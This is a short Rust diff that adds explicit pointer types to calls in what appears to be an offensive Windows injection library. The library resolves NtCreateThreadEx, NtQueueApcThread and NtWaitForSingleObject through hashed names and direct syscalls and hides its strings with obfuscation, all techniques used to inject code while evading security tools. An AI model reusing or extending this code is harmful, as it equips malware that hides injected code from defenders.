@@ -14,7 +14,7 @@ pub fn create_remote_thread_ex(process_handle: isize, start: usize, arg: usize) 
         NtCreateThreadExFn,
         &mut thread_handle,
         THREAD_ALL_ACCESS,
-        core::ptr::null_mut(),
+        core::ptr::null_mut::<c_void>(),
         process_handle,
         start as *mut c_void,
         arg as *mut c_void,
@@ -22,7 +22,7 @@ pub fn create_remote_thread_ex(process_handle: isize, start: usize, arg: usize) 
         0usize,
         0usize,
         0usize,
-        core::ptr::null_mut(),
+        core::ptr::null_mut::<c_void>(),
     ).ok_or_else(|| obfstr!("Failed to resolve NtCreateThreadEx").to_string())?;
 
     if status < 0 {
@@ -38,7 +38,7 @@ pub fn create_thread_ex(start: usize, arg: usize) -> Result<isize, String> {
 
 pub fn wait_for_single_object(handle: isize) -> i32 {
     let nt_wait_hash = crate::dbj2_hash!(b"NtWaitForSingleObject");
-    syscall!(nt_wait_hash, NtWaitForSingleObjectFn, handle, 0u8, core::ptr::null_mut()).unwrap_or(-1)
+    syscall!(nt_wait_hash, NtWaitForSingleObjectFn, handle, 0u8, core::ptr::null_mut::<i64>()).unwrap_or(-1)
 }
 
 pub fn close_handle(handle: isize) {
@@ -57,9 +57,9 @@ pub fn queue_apc_thread(thread_handle: isize, routine: usize) -> Result<(), Stri
         NtQueueApcThreadFn,
         thread_handle,
         routine as *mut c_void,
-        core::ptr::null_mut(),
-        core::ptr::null_mut(),
-        core::ptr::null_mut(),
+        core::ptr::null_mut::<c_void>(),
+        core::ptr::null_mut::<c_void>(),
+        core::ptr::null_mut::<c_void>(),
     )
     .ok_or_else(|| obfstr!("Failed to resolve NtQueueApcThread").to_string())?;
 
